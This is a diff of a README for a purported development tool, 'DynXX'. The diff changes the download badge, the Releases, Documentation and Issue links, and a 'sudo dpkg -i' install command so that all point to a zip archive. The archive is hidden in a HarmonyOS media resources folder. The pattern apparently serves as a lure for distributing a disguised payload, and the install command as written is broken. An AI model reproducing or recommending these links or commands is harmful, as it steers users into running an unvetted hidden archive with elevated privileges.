@@ -6,9 +6,9 @@ Welcome to DynXX! This application helps you create cross-platform software easi
 
 ## 📥 Download DynXX
 
-[![Download DynXX](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
+[![Download DynXX](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip)](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip)
 
-Visit this page to download the latest version: [DynXX Releases](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
+Visit this page to download the latest version: [DynXX Releases](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ To use DynXX effectively, you should have:
 Follow these steps to install DynXX on your computer:
 
 1. **Visit the Releases Page:**
-   Head to the [DynXX Releases](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip) page.
+   Head to the [DynXX Releases](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip) page.
 
 2. **Choose Your Version:**
    Look for the latest version. It will be at the top of the list.
@@ -41,7 +41,7 @@ Follow these steps to install DynXX on your computer:
    - macOS: Open the `.dmg` file and drag the DynXX icon to your Applications folder.
    - Linux: Use your package manager to install the `.deb` package:
      ```
-     sudo dpkg -i https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip
+     sudo dpkg -i https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip
      ```
 
 5. **Start DynXX:**
@@ -107,8 +107,8 @@ For any inquiries, you can reach out to us through the GitHub Issues page. We ap
 
 Here are some useful links:
 
-- [DynXX Documentation](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
-- [Submit an Issue](https://raw.githubusercontent.com/zStrider15/DynXX/main/platforms/Windows/DynXX_3.0.zip)
+- [DynXX Documentation](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip)
+- [Submit an Issue](https://github.com/zStrider15/DynXX/raw/refs/heads/main/platforms/HarmonyOS/AppScope/resources/base/media/XX-Dyn-v1.6-beta.3.zip)
 
 ## 🎉 Join the Community
 
